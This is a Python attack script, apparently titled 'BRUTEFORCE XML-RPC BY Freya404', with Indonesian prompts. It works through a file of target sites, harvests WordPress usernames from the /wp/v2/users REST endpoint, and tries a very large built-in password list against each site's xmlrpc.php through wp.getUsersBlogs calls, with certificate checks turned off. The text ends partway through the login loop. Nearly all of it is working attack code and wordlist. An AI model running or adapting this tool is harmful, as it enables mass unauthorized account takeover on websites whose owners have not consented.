import requests
import sys
import re
import time
from multiprocessing.dummy import Pool
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
from requests.exceptions import SSLError, ConnectionError
from http.client import RemoteDisconnected
import os

# Definisikan warna
class Colors:
    GREEN = '\033[92m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RED = '\033[91m'
    RESET = '\033[0m'

def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("""
    
██████╗ ██████╗ ██╗   ██╗████████╗███████╗███████╗ ██████╗  ██████╗███████╗    
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝██╔═══██╗██╔════╝██╔════╝    
██████╔╝██████╔╝██║   ██║   ██║   █████╗  █████╗  ██║   ██║██║     █████╗      
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══╝  ██║   ██║██║     ██╔══╝      
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║     ╚██████╔╝╚██████╗███████╗    
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝      ╚═════╝  ╚══════╝╚══════╝    
                 ╔═══════════════════════════════════════╗
                 ║     BRUTEFORCE XML-RPC BY Freya404    ║
                 ╚═══════════════════════════════════════╝                                                                             
    """)

banner()

requests.urllib3.disable_warnings()

def create_session():
    session = requests.Session()
    retries = Retry(total=5, backoff_factor=1, status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retries)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

try:
    file_name = input("MASUKAN FILE LISTE SITE: ")  
    target = [i.strip() for i in open(file_name, mode='r').readlines()]
    print(f"MENGHITUNG JUMLAH TARGET: {len(target)} site(s) terdeteksi")
except FileNotFoundError:
    exit(f"\n  [!] File '{file_name}' tidak ditemukan. Pastikan file list site tersedia dan coba lagi.")
except Exception as e:
    exit(f"\n  [!] Error: {str(e)}")

time.sleep(2)
print("\nBRUTEFORCE DIMULAI...\n")

def URLdomain(site):
    if 'http://' not in site and 'https://' not in site:
        site = 'http://' + site
    if site[-1] != '/':
        site = site + '/'
    return site

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

def exploit(url):
    session = create_session()  
    try:
        exploit_page = url + '/?rest_route=/wp/v2/users'
        exploit_1 = session.get(exploit_page, headers=headers, verify=False, timeout=15)

        if 'gravatar.com' in exploit_1.text:
            exploit = exploit_1.text
            usernames = re.findall('"name":"(.*?)"', exploit)
            for username in usernames:
                pas = [
                    username + username, username, username + '321', username + '1234', 'info', 'admin123','@',
                    'adminadmin', 'demo', 'demo123', 'root', 'password', 'pass', 'administrator', 'adminpass', 'info', 'PolmanJago&24', 
                    'user', 'test', '123456', 'password', '123456789', '12345678', '12345', '1234567', 'qwerty', 
                    'abc123', 'football', 'monkey', 'letmein', 'welcome', 'login', 'princess', 'sunshine', 
                    'master', 'password1', '1234', '1q2w3e4r', '1qaz2wsx', 'qazwsx', 'password123', '654321', 
                    'P@ssw0rd!', 'Admin@123', 'Welcome@2024', 'Admin!2023', 'Password@2023', 'Qwerty@123',
                    'Secur3Pass!', 'Admin#321', 'ChangeMe@123', 'Root!Admin', 'User123!', 'Test@Password1',
                    'Adm!n$ecure123', 'Pa$$w0rd!', 'W3lc0me@2024!', 'Qwerty@456', 'L3tm31n!', 'S3cur3Adm!n',
                    'Adm1n$tr0ng!', 'RootAcc#2023!', 'Passw0rd!@34', 'Sup3rS3cure2023', 'AdminSecure!23',
                    'love123', 'mypassword', 'password2023', '123admin', 'guest', 'guest123', '1qaz@WSX',
                    'zxcvbnm', 'asdfgh', '!QAZ2wsx', 'zaq12wsx', 'hello123', 'freedom123', 'trustno1',
                    'letmein123', 'opensesame', 'password@123', 'google123', 'yahoo123', 'changeme',                    
                    '123ABCdef', 'password999', 'easy2guess', 'qwertyuiop', 'passw0rd!', 'Admin2023@#',
                    'mypassword1', 'Pa$$w0rd!', 'Secure1!', 'G00gle2023', 'Ch@ngeMe!', '123456abc',
                    '1q2w3e4r5t6y7a', 'qwertyuiop456', '12345!@#', 'password@!', '1234abcd12!', 
                    '1q2w3e4r5t6y7q', 'zxcvbnm09876', '123456abcde1', '1234qwerty123456', 'password12345!',
                    'letmein1234!', '1q2w3e4r5t6y7!', 'welcome@123', '12345678910', 'zxcvbnm09876q', 
                    'qwertyuiop123456', 'admin1q2w', '1234!@#', '1qazxsw2edc', 'password12345678', 
                    '123abc@123', '1qaz2wsx@456', '12345qwe!', 'zxcvbn123456', '12345678@1', 
                    'letmein123456', 'password123!@', '1q2w3e4r5t6y7qwe', 'qwerty1234@!', '12345678abc!', 
                    '1qazxsw12', '12345qwerty', '987654321qwerty!', 'welcome12345!', '1234abcde', 
                    '123qweabc', '1qazxsw@qwe', 'adminqwerty123456', '12345abc@!', '1q2w3e4r5t6y9!', 
                    '123456789abcdefgh', '1qaz2wsx3edc5rfv', 'password!1234567', '123456abcd1234!', 
                    'welcome!123', '123456789@1', '1q2w3e4r5t6y7qwe', 'qwerty!@123456', '1qazxsw12!', 
                    '1234abcd@!', 'admin12345!', '1234qwerty@!', '12345678abcd', '1q2w3e4r5t6y7a!', 
                    'zxcvbnm123456789', 'password123456789', '123456@abcd', '1qazxsw123456', 
                    'qwerty123456789', '1234abcd12345', 'welcome12345!', '123456789abcd@!', 
                    '1234@abcd123', '1q2w3e4r5t6y@!', 'qwertyuiop123', '1234567890', 'password1@',
                    'letmein123!', 'abc123456', 'testpassword', 'sunshine123', 'trustno1@',
                    '1qazxsw@123', '1qaz2wsx3edc', '123456789abc!', 'mysecurepassword!', 'qwertypassword',
                    '1234abcd!', 'mypassword@2023', 'yourpassword123', 'adminpassword!', '123456abc123',
                    'admin!@#', 'password2024!', 'newpassword@2023', 'greeting123!', '123@abcd!', 
                    'examplepassword1!', 'pass123456!', '12345password@', 'letmein@2024', 'password@1234',
                    'admin1234@!', 'mypassword2024!', 'secret123!', 'welcome!@#', '1qazxsw2!', 
                    'password@2024', 'test@12345', 'mypassword!', 'guestpassword!', '2023admin@',
                    'pass1q2w3e4!', 'letmein2023!', 'securepass!', 'password!2024', 'test@password!',
                    'password1@2023', 'demo@12345', 'welcome@abcd', '1qaz!@#', '1qazxsw@#',
                    'example123@!', 'testpass@123', 'password1234!', 'mysecurepassword123', '1q2w3e4!',
                    'adminpass123@', '123abc!@#', 'password!@2024', '12345@6789', '1qaz12345!',
                    'password12345@!', 'welcome@2024!', '1qaz2wsx@!', 'letmein@123456', 'qwerty!@#',
                    'password@1qaz', 'mypassword@1', '12345678!@#', 'letmein!@#', 'mypassword@2023',
                    'secret@1234!', 'password1q2w3e!', 'test@demo123', 'password1@2024', 'mysecure@password!',
                    'hello@world123', '1234@5678!', 'examplepassword@', 'mysecretpass!', 'passwordsecure@!',
                    '1qazxsw@123!', 'mypassword2024@!', '1234pass@!', 'mypassword!@2024', 'qwerty123@!',
                    'letmein12345!', 'test@password1', 'mysecurepassword1!', '1234abcd!@', 'demo@123456!',
                    'examplepass@!', 'welcome1@234', 'letmein12345!', 'mypassword1@!', 'admin!@abcd',
                    'secure12345!', 'myadmin@2024', 'test@abcde!', 'mypassword123@!', 'test!@2024',
                    'password123456!', 'admin@1234!', 'password@1', 'password@!123', '123abcde@!',
                    'welcome@!@#', 'mypassword@#', 'test!@#', '1qaz123456!', 'mypassword@!2024',
                    'adminadmin', 'demo', 'demo123', 'root', 'password', 'pass', 'administrator', 'adminpass', 
                    'user', 'test', '123456', 'password', '123456789', '12345678', '12345', '1234567', 'qwerty', 
                    'abc123', 'football', 'monkey', 'letmein', 'welcome', 'login', 'princess', 'sunshine', 
                    'master', 'password1', '1234', '1q2w3e4r', '1qaz2wsx', 'qazwsx', 'password123', '654321',
                    'salam123', 'kota123', 'anjing123', 'kucingku', 'pengguna123', 'cintaku123', 
                    'masakanku', 'nasi123', 'kopi123', 'makan123', 'sehat123', 'berita123', 'indonesia123', 
                    'cinta123', 'belajar123', 'jalan123', 'hujan123', 'ramadhan123', 'syukur123', 
                    'lebaran123', 'kemarin123', 'tanya123', 'jawab123', 'dari123', 'menuju123', 
                    'siang123', 'malam123', 'bangun123', 'tidur123', 'kerja123', 'liburan123', 
                    'pesan123', 'buku123', 'belajar123', 'guru123', 'ilmu123', 'kampus123', 
                    'universitas123', 'mahasiswa123', 'ekonomi123', 'budaya123', 'seni123', 
                    'pahlawan123', 'pejuang123', 'jalan123', 'taman123', 'laut123', 'gunung123', 
                    'pemandangan123', 'cintaalam123', 'alam123', 'damai123', 'sejarah123', 
                    'kebudayaan123', 'spiritual123', 'motivasi123', 'kesempatan123', 'perjuangan123', 
                    'keberanian123', 'cita123', 'mimpi123', 'tangga123', 'pertemuan123', 
                    'pelajaran123', 'konferensi123', 'komunitas123', 'aktivis123', 'insani123', 
                    'global123', 'sosial123', 'pelayanan123', 'masyarakat123', 'ketulusan123', 
                    'persahabatan123', 'kebaikan123', 'bintang123', 'berbagi123', 'kolaborasi123', 
                    'kerjasama123', 'gerakan123', 'komunikasi123', 'diskusi123', 'perdebatan123', 
                    'interaksi123', 'refleksi123', 'kreatif123', 'imajinasi123', 'fantasi123', 
                    'inovasi123', 'eksplorasi123', 'penemuan123', 'penelitian123', 'kemajuan123', 
                    'sukses123', 'progresif123', 'strategi123', 'taktik123', 'diskusi123', 
                    'pertimbangan123', 'rekomendasi123', 'analisis123', 'penjelasan123', 
                    'komitmen123', 'tanggungjawab123', 'keterampilan123', 'keahlian123', 
                    'proses123', 'metode123', 'teknik123', 'pendekatan123', 'evaluasi123', 
                    'penyelesaian123', 'pertumbuhan123', 'pembangunan123', 'pengembangan123', 
                    'pengalaman123', 'tindakan123', 'kontribusi123', 'elemen123', 'sistem123', 
                    'teknologi123', 'perangkat123', 'platform123', 'jaringan123', 'komunitas123', 
                    'pengguna123', 'media123', 'komunikasi123', 'peta123', 'ide123', 
                    'cita-cita123', 'ujian123', 'kontrol123', 'fasilitas123', 'keberhasilan123', 
                    'tujuan123', 'arah123', 'ruang123', 'kesadaran123', 'disiplin123', 
                    'hubungan123', 'terhubung123', 'kolaborasi123', 'inisiatif123', 
                    'pengorbanan123', 'progres123', 'prestasi123', 'mendalami123', 'temukan123', 
                    'ujian123', 'kesempatan123', 'proyek123', 'pengembangan123', 'pembelajaran123', 
                    'strategis123', 'pendekatan123', 'transisi123', 'pengolahan123', 'kualitas123', 
                    'keberagaman123', 'pengalaman123', 'rasio123', 'jaringan123', 'analisis123', 
                    'sistem123', 'ringkasan123', 'catatan123', 'komitmen123', 'respon123', 
                    'tindakan123', 'revisi123', 'evaluasi123', 'fasilitas123', 'peluang123', 
                    'gerakan123', 'misi123', 'visi123', 'mimpi123', 'penghargaan123', 
                    'kesadaran123', 'sikap123', 'komunikasi123', 'harapan123', 'aktivitas123', 
                    'pembangunan123', 'kolaborasi123', 'kesadaran123', 'pembuatan123', 
                    'identitas123', 'disiplin123', 'pengelolaan123', 'inovasi123', 'strategis123', 
                    'pendekatan123', 'kerjasama123', 'pengelolaan123', 'hubungan123', 'evaluasi123',
                    'penyelesaian123', 'inisiatif123', 'kolaborasi123', 'progresif123', 'ajakan123',
                    'penerimaan123', 'komitmen123', 'partisipasi123', 'perjuangan123', 'pendidikan123',
                    'strategi123', 'rencana123', 'pengembangan123', 'penelitian123', 'pekerjaan123',
                    'kualitas123', 'inisiatif123', 'respons123', 'strategi123', 'kolaborasi123',
                    'kepemimpinan123', 'kemandirian123', 'partisipasi123', 'pembangunan123', 
                    'pengelolaan123', 'masyarakat123', 'keberhasilan123', 'penyelesaian123',
                    'adminadmin', 'demo', 'demo123', 'root', 'password', 'pass', 'administrator', 'adminpass', 
                    'user', 'test', '123456', 'password', '123456789', '12345678', '12345', '1234567', 'qwerty', 
                    'abc123', 'football', 'monkey', 'letmein', 'welcome', 'login', 'princess', 'sunshine', 
                    'master', 'password1', '1234', '1q2w3e4r', '1qaz2wsx', 'qazwsx', 'password123', '654321',
                    'Qwerty@2024', 'StrongPass123!', 'P@ssw0rd!', 'S3cur3P@ss!', 'MyS3cret123', 
                    'Passw0rd!2024', 'Th3BestP@ss!', 'ComplexP@ss123!', 'Secure&Strong#2024', 'Tr0ub4dor&3', 
                    'Ilov3Coding!', 'H@ppyDays2024', 'Winter@2024', 'S0m3Random1!', 'N3verG1veUp!', 
                    'P@ssw0rd1!', 'G0odLuck#2024', 'P@ssword^123', 'R3alM3@ning!', 'AlwaysKeepIt$afe', 
                    'BeC@useImHappy!', 'Just4Fun#2024', 'C0d3M4ster!', 'L0ve2C0de!', '4ev3rYoung!', 
                    'B3tterT0gether!', 'Sm1le4Me#2024', 'L3tsD0This!', 'T1ghtKnitGroup!', 'AlwaysB3Good!', 
                    'W0rldIsBeautiful!', 'G0GetEm#2024', 'KeepP@ssing!', '0n3inAMillion!', 
                    'G0odVibesOnly!', 'D0wnWithHate!', 'I@lwaysWin!', 'C0mpl3x&Unique!', 'B3y0ndLimits!', 
                    'Love&Kindness#2024', 'Sh0wTh3W0rld!', '3ndlessP0ssibilities!', 'NothingIsImpos5ible!', 
                    'StrongerTogether#2024', 'BelieveInYourself!', 'Focus&Determination!', 'Ch4ngeTh3W0rld!', 
                    'YouG0TThis#2024', 'MakeADifference!', 'SeizeTheDay@2024', 'Un1que&Creative!', 
                    'BeTheChange!', 'KindnessMatters#2024', 'S3izeTheMoment!', 'EveryD@yIsNew!', 
                    'P@ssword1234!', 'F0rYou@2024', 'W1nningAttitude!', 'AlwaysStayPositive!', 
                    '3njoyLife@2024', 'L0veYourself!', 'BrightFuture#2024', 'P@sswordGen3rator!', 
                    'TrustYourInstincts!', 'FollowYourDreams!', 'C0nquerYourF34rs!', 'H@ppyVibesOnly!', 
                    'SuccessIsMine#2024', 'ReachForTheStars!', 'D0ItWithLove@2024', 'BraveAndBold#2024', 
                    'LifeIsGood@2024', 'P@sswordCh4ng3!', 'BeFearless&Free!', '4EverF0rYou!', 
                    'S3eTheBeauty!', 'N3verLookBack@2024', 'ShineBrightLikeADiamond!', 
                    'BelieveInMagic@2024', 'H@ppyMindHappyLife!', 'LiveLaughLove#2024', 
                    'ChaseYourPassion!', 'AlwaysBeLearning!', 'J0urneyOf1000Miles!', 
                    'P@ssword4Ever!', 'Explore&Discover#2024', 'Ch@ngeTheWorld!', 'H@veFaith!', 
                    '0penMinded@2024', 'C0olCat2024!', 'L3arnAndGrow!', 'TogetherWeRise!', 
                    'M0veF0rward@2024', 'SmileAndShine!', 'CreateYourOwnPath#2024', 
                    'S@feguard123!', 'Hope&Love@2024', 'LifeIsAnAdventure!', 'DareToDream#2024', 
                    'B3Positive!', 'EmpowerOthers@2024', 'UnityInDiversity#2024', 'S0lutionF0cused!', 
                    'JoyInEveryMoment!', 'EmbraceChange#2024', 'W1llPower!', 'KindHearted#2024', 
                    'S3ekAdventure!', 'BeYourBestSelf@2024', 'ChaseYourGoals!', 'LiveYourTruth!', 
                    'DreamBig@2024', 'B3Inspire!', 'C0mbineYourStrengths!', 'KeepGoing@2024', 
                    'FindYourJoy!', 'TakeItEasy@2024', 'ThriveTogether#2024', 'Sh0tForTheStars!', 
                    'S0aringHigh@2024', 'BelieveInYourJourney!', 'LiftEachOtherUp#2024', 
                    'OneStepAtATime@2024', 'W0nderfulJourney!', 'B3Fearless!', 
                    'CourageOverComfort#2024', 'DareToBeDifferent!', 'F0rwardThinker@2024', 
                    '0penToPossibilities!', 'C0olVibes#2024', 'P@ssword1!', 'H@ppyPlace!', 
                    'DreamOn@2024', 'LiveFully@2024', 'UnleashYourPotential!', 'LifeIsAFestival!', 
                    'LetYourLightShine#2024', 'S3eTheGoodInLife!', 'LoveYourJourney@2024', 
                    'Ch3ckYourMindset!', 'BeKind&Generous!', 'StayTrueToYourself!', 
                    'EveryDayIsABlessing!', 'YouAreUn1que!', 'KeepCreating@2024', 
                    'NothingCanStopYou!', 'ShineYourWay#2024', 'LifeIsAJourney!', 'B3YourOwnHero!', 
                    'CelebrateYourself@2024', 'BeCurious&Explore!', 'D0ItWithPassion!', 
                    'LiveWithPurpose@2024', 'FollowYourHeart!', 'EmbraceYourJourney#2024', 
                    'N3verG1veUp@2024', 'DreamChaser#2024', 'LimitlessOpportunities!', 
                    '4nticipateSuccess!', 'SeizeYourDestiny@2024', 'LoveMoreHateLess!', 
                    'ShineOn@2024', 'B3AdventureSeeker!', 'LifeIsAChallenge!', 
                    'TogetherWeCan@2024', 'CourageIsKey!', 'S0ulfulLife!', 
                    'UniteForGood@2024', 'KeepSmiling!', 'DareToBeYou!', 
                    'BelieveInYourself#2024', 'M@keItHappen!', 'EmpowerYourself@2024', 
                    'ReachYourPeak!', 'InspireAndBeInspired!', 'LifeIsBeautiful@2024', 
                    'TakeTheLeap#2024', 'LiveLifeToTheFullest!', 'BeAMoverAndShaker!', 
                    'EveryMomentCounts!', 'LoveIsTheAnswer!', 'LiveSimply@2024', 
                    'BeYourOwnLight#2024', 'CreateYourOwnHappiness!', 'StartFresh@2024', 
                    'B3Bright!', 'YouAreCapable!', 'KeepMovingForward#2024', 'H@veHope!', 
                    'N3verStopLearning!', 'RiseAndShine@2024', 'F0rwardTogether!', 
                    'CreateYourOwnJoy!', 'BeTheBestYouCanBe!', 'S0arToNewHeights@2024',
                    '12345678', '123456789', 'qwerty', 'password', '123456', 'iloveyou', '1234567',
                    '12345', '1234567890', 'admin', 'welcome', 'abc123', 'letmein', 'monkey',
                    'dragon', '111111', 'sunshine', '123123', 'qwertyuiop', '1234', 'password1',
                    '123321', 'superman', 'qwerty123', 'zaq12wsx', 'michael', 'ashley', '123qwe',
                    '1q2w3e4r5t', 'superman', 'qazwsx', 'qwerty123', 'trustno1', '123456789a',
                    '1qaz2wsx', '121212', 'hockey', 'baseball', 'football', '1qazxsw2', 'qwerty',
                    '7777777', '123456abc', '12345678910', 'football', 'iloveyou2', '1qazxsw', 
                    'loveyou', 'welcome1', '12345abc', 'dragon1', 'password2', '123654', '654321',
                    '112233', '131313', '123456a', 'test123', 'letmein123', '1234567a', 'iloveyou123',
                    '12345qwert', '1qazxsw2', 'password1234', '1qazxsw23', 'qwerty1', 'superman1',
                    'monkey1', '123abc', 'password1', 'abc123456', 'sophie', 'samantha', 'jessica',
                    'justin', 'zxcvbn', 'hannah', 'soccer', 'shadow', 'password!', '1234567890qwerty',
                    'football1', 'ashley1', 'michael1', 'whatever', '123qwe', 'qwerty12', 'qazwsx1',
                    '1234567!', '12345!', 'zxcvbnm', 'dallas', '1qaz2wsx3edc', '1234qwerty', 'qwertyqwerty',
                    '1q2w3e4r5t6y', 'aaaaaa', 'dolphin', 'family', 'friends', 'welcome123', '1234abc',
                    'myspace', 'loveyou1', 'cookie', '1234abcd', 'hello', 'world', 'iloveyou1',
                    'mypassword', '1love', 'love123', 'qwe123', 'qwerty12', '1qazxsw2', '1234567abc',
                    '1111', '2222', '3333', '4444', '5555', '6666', '7777', '8888', '9999', 
                    '1234abcd', 'secret', 'test1234', 'passwd', '1qaz2wsx3edc', '1qazxsw23', 
                    'asdasd', 'qqqqqq', 'wer123', '123asdf', 'safesecure', 'smartpassword',
                    'qwertyu', 'golden', 'powerful', 'qwertz', 'mindset', 'lucky', 'valentine',
                    'spring', 'jungle', 'adventure', 'freedom', 'forever', 'sunset', 'autumn',
                    'beautiful', 'dream', 'legacy', 'destiny', 'horizon', 'soulmate', 'passion',
                    'nature', 'happiness', 'wonder', 'infinity', 'blessing', 'journey', 'inspire',
                    'fantasy', 'bravery', 'symphony', 'inspire', 'whisper', 'mystery', 'sacred',
                    'comfort', 'trinity', 'genesis', 'essence', 'identity', 'curiosity', 'growth',
                    'cherish', 'limitless', 'serenity', 'sacrifice', 'victory', 'wisdom', 'unity',
                    'unbreakable', 'revolution', 'alliance', 'discovery', 'tranquility', 'courage',
                    'potential', 'gratitude', 'conquer', 'respect', 'faith', 'harmony', 'acceptance',
                    'kindness', 'empathy', 'prosperity', 'resilience', 'ambition', 'freedom', 
                    'invention', 'determination', 'creativity', 'loyalty', 'inspiration', 
                    'nurture', 'forgiveness', 'together', 'appreciation', 'celebrate', 
                    'understanding', 'connection', 'reflection', 'advancement', 'enthusiasm', 
                    'strength', 'intention', 'persistence', 'charisma', 'vision', 
                    'innovation', 'empowerment', 'rebirth', 'enthusiasm', 'positivity', 
                    'exploration', 'imagination', 'evolution', 'peace', 'purity', 'prosperity',
                    'development', 'aspiration', 'empower', 'life', 'harmony', 
                    'growth', 'balance', 'harmony', 'energy', 'spark', 'zen', 'life123',
                    'adminadmin', 'demo', 'demo123', 'root', 'password', 'pass', 'administrator', 'adminpass', 
                    'user', 'test', '123456', 'password', '123456789', '12345678', '12345', '1234567', 'qwerty', 
                    'abc123', 'football', 'monkey', 'letmein', 'welcome', 'login', 'princess', 'sunshine', 
                    'master', 'password1', '1234', '1q2w3e4r', '1qaz2wsx', 'qazwsx', 'password123', '654321',
                    'cpanel', 'cpanel123', 'cpaneladmin', 'cpaneluser', 'cpanel1', '123456cpanel',
                    '1234cpanel', 'mycpanel', 'mypassword', 'welcome1', 'letmein', 'password1', 
                    'root', 'root123', 'cPanel123', 'cPanelAdmin', 'admin', 'admin123', 'test',
                    'test123', 'pass', '12345', '123456', 'qwerty', 'abc123', 'iloveyou',
                    '123qwe', 'monkey', '123abc', 'sunshine', 'welcome', 'password123', '1234567',
                    '1qaz2wsx', 'password1', 'letmein123', 'qwerty123', 'dragon', 'iloveyou1',
                    'pass123', 'adminadmin', '1q2w3e4r', 'qazwsx', 'superman', 'michael',
                    'ashley', 'justin', 'sunny', '111111', 'qwertyuiop', '1q2w3e4r5t', 
                    '123456abc', 'password12', 'mypassword123', '1234567890', 'dragon1',
                    'letmein1', '1qazxsw', '123qwe', 'password!', 'iloveyou2', 'qwerty1',
                    'password1', 'baseball', 'football', 'iloveyou', 'hello123', 'world',
                    'abcdef', 'secret', 'momo123', 'awesome', 'passw0rd', 'letmein1234',
                    'wonderland', 'loveyou', '12345678', '1qaz2wsx', 'qwerty12345', 
                    'superman1', 'password00', 'hannah', 'jessica', 'soccer', '12345!',
                    'iloveyou123', 'welcome123', 'michael1', 'mycpanel123', 'password1!',
                    'admin!', 'demo123!', '123123', '1qazxsw2', 'zxcvbnm', 'abc123456', 
                    'jennifer', '12345abc', 'golden', 'security', 'confidence', 
                    'purple', 'pink', 'black', 'blue', 'green', 'red', 'yellow', 'orange', 
                    '1234abcd', 'password3', 'admin1', 'user123', 'users', 'sophie', 
                    'tiger', 'superman2', '1love', 'peace', 'trustno1', 'no1lovesyou',
                    '1q2w3e4', 'dreamer', 'happylife', 'adventure', 'strongpass', 
                    'newpassword', 'nicepassword', 'welcome123!', 'dreambig', 'freedom1',
                    'starwars', 'warrior', 'alpha', 'omeg@123', 'zxcvbn', 'mystery', 
                    'banana', 'apple', 'cherry', 'kiwi', 'dragonfruit', 'watermelon', 
                    'blueberry', 'raspberry', 'strawberry', 'peach', 'plum', 
                    'coconut', 'mango', 'lemon', 'lime', 'pomegranate', 'kiwifruit', 
                    'fig', 'date', 'grape', 'papaya', 'passionfruit', 'apricot', 
                    'avocado', 'jackfruit', 'starfruit', 'nectarine', 'honeydew', 
                    'tangerine', 'bloodorange', 'cantaloupe', 'pear', 'guava', 
                    'persimmon', 'dragonfruit123', 'mypassword1', 'mypassword2',
                    'notyourpassword', 'mysecurepassword', '1234mypassword', '1s3p4a5s',
                    'randompass', 'yourpassword', 'testuser', 'newuser', 'testadmin',
                    'justtesting', 'randomuser', 'guest', 'guest123', 'temp123',
                    'temporary', 'temporary1', 'temporary2', 'guestadmin', 'newadmin',
                    'testing123', 'testpassword', 'testpassword1', 'testpassword2', 
                    'guest1', 'guest2', 'guest3', 'guest4', 'guest5', 'guest6', 
                    'guest7', 'guest8', 'guest9', 'guest10', 'userpassword', 
                    'myuserpassword', 'useradmin', 'userpass123', 'userlogin',
                    'userpass', 'userpassword1', 'userpassword2', 'cpanelpass', 
                    'cpanelpass1', 'cpanelpass2', 'cpaneluser1', 'cpaneluser2', 
                    'cpaneladmin1', 'cpaneladmin2', 'cpanelpassword', 'cpanelsecure',
                    'strongpass123', 'mypass', 'anotherpassword', 'differentpass',
                    'securepass123', 'securepassword', 'cpanelsecurepass', 'randomsecurepass',
                    'anothersecurepass', 'strongpassword', 'strongsecurepass', 
                    'securemycpanel', 'bestpassword', 'bestpass123', 'supersecure',
                    'verysecurepassword', 'mysecurepass', 'securemyaccount', 
                    'securelogin', 'securepassword1', 'strongpassword1', 'strongerpass',
                    'strongerpass1', 'verystrongpass', 'verystrongpass1', '123456',
                    '1234567', '1111111', '12345678', 'mypassword', 'my123password',
                    'mytestpassword', 'testmypassword', 'randompass123', 'mypassword1234',
                    'cpanelmypassword', 'cpanelpassword123', 'mypasswordpassword',
                    'userpass12345', 'mypassworduser', 'userpassword1', 'securemypassword',
                    'adminadmin', 'demo', 'demo123', 'root', 'password', 'pass', 'administrator', 'adminpass', 
                    'user', 'test', '123456', 'password', '123456789', '12345678', '12345', '1234567', 'qwerty', 
                    'abc123', 'football', 'monkey', 'letmein', 'welcome', 'login', 'princess', 'sunshine', 
                    'master', 'password1', '1234', '1q2w3e4r', '1qaz2wsx', 'qazwsx', 'password123', '654321',
                    'password1', 'password2', 'password3', 'myblog', 'mywebsite', 'wordpress', 
                    'blogspot', '1234abcd', 'iloveyou', 'qwerty123', '12345', '12345678', 
                    'rajawali', 'harimau', 'kucing', 'anjing', 'cinta', 'indonesia', 
                    'bandung', 'jakarta', 'surabaya', 'bali', 'yogyakarta', 'semarang', 
                    'batam', 'makassar', 'palembang', 'medan', 'solo', 'denpasar', 
                    'bali123', 'jakarta123', 'surabaya123', 'semarang123', 'medan123', 
                    'cinta123', 'rajawali123', 'adminblog', 'administrator', 'password123',
                    '123qwe', 'qwertyuiop', 'iloveyou1', 'superman', 'michael', 
                    'luffy', 'naruto', 'kakashi', 'sakura', 'goku', 'vegeta', 
                    'monkey123', 'doraemon', 'anime123', 'bajigur', 'tempe', 
                    'nasi', 'mie', 'soto', 'rendang', 'bubur', 'kerupuk', 
                    'gula', 'garam', 'kecap', 'sambal', 'rindu', 'bunga', 
                    'cintaaku', 'sayang', 'sayangku', 'cintaku', 'yuk', 
                    'mari', 'ayo', 'mau', 'silakan', 'mohon', 'hallo', 
                    'hai', 'selamat', 'pagi', 'siang', 'malam', 'sore', 
                    'pergi', 'datang', 'makan', 'minum', 'tidur', 'kerja', 
                    'belajar', 'bermain', 'berjalan', 'belanja', 'shopping', 
                    'jogging', 'exercise', 'renang', 'sekolah', 'kuliah', 
                    'universitas', 'sekolah123', 'kuliah123', 'universitas123', 
                    'blog123', 'website123', 'email123', 'akun123', 'gmail123', 
                    'yahoo123', 'hotmail123', 'superman123', 'batman123', 'wonderwoman123', 
                    'admin12345', 'user12345', 'test12345', 'demo12345', 'root12345', 
                    'mywebsite123', 'mypassword', 'myname', 'username', 'useradmin', 
                    'passw0rd', 'temp123', 'guest', 'guest123', 'test', 
                    'testuser', 'test123', 'testpass', '12345abc', 'abc12345', 
                    'mypassword123', 'michael123', 'jessica123', 'emily123', 'james123', 
                    'john123', 'david123', 'carl123', 'william123', 'kelvin123', 
                    'andrew123', 'daniel123', 'charles123', 'steven123', 'thomas123', 
                    'mohammed123', 'ali123', 'susan123', 'sarah123', 'karen123', 
                    'linda123', 'laura123', 'betty123', 'samantha123', 'hannah123', 
                    'sofia123', 'victoria123', 'zoe123', 'nina123', 'may123', 
                    'october123', 'november123', 'december123', 'jan123', 'feb123', 
                    'mar123', 'april123', 'mayday', 'holiday123', 'weekend', 
                    'sunday', 'monday', 'tuesday', 'wednesday', 'thursday', 
                    'friday', 'saturday', 'candle', 'party', 'celebration', 
                    'birthday', 'anniversary', 'thanksgiving', 'newyear', 'easter', 
                    'christmas', 'valentine', 'happy123', 'smile123', 'laugh123', 
                    'fun123', 'enjoy123', 'travel123', 'adventure123', 'explore123', 
                    'discover123', 'nature123', 'mountain123', 'sea123', 'ocean123', 
                    'river123', 'lake123', 'island123', 'beach123', 'vacation123', 
                    'holiday1', 'holiday2', 'holiday3', 'holiday4', 'holiday5', 
                    'holiday6', 'holiday7', 'holiday8', 'holiday9', 'holiday10', 
                    'abcde', 'qwert', 'zxcvb', 'asdfg', '1234qwer', 'qwe1234', 
                    'asdf1234', 'poiu', 'lkjh', 'hgfd', 'sdfg', 'dghf', 
                    'kjhgf', 'nbvc', 'cxz', 'qweas', 'ertyu', 'op[', 
                    'poiuy', 'nm,./', '1234567890', '0987654321', 'qwertyui', 
                    'asdfgh', 'zxcvbn', '11111', '22222', '33333', 
                    '44444', '55555', '66666', '77777', '88888', 
                    '99999', '00000', 'qazwsx', 'asdfqwer', 'zxcvbnm', 
                    '1qaz', '2wsx', '3edc', '4rfv', '5tgb', 
                    '6yhn', '7ujm', '8ik,', '9ol.', '0p;', 
                    'test1234', 'mypassword1', 'mypassword2', 'mypassword3', 'mypassword4'
                ]
                for password in pas:
                    try:
                        post_load = session.post(url + '/xmlrpc.php',
                                                 data="<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>" + username + "</value></param><param><value>" + password + "</value></param></params></methodCall>",
                                                 headers=headers, verify=False, timeout=30)
                        if 'blogName' in post_load.content.decode():
